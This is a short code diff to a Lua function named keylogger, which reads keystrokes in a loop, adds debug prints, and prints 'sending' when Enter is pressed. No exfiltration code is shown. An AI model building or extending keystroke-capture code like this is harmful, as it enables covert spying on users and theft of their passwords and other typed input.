@@ -5,9 +5,13 @@ function keylogger()
 	local Pressed = {}
 
 	while true do
-		local key = asciiToString(mylib.getKey())
+		local keyValue = mylib.getKey()
+		local key = asciiToString(keyValue)
 
-		if(key==13) then
+		print(key)
+
+		if(keyValue==13) then
+			print("sending")
 			break
 		end
 
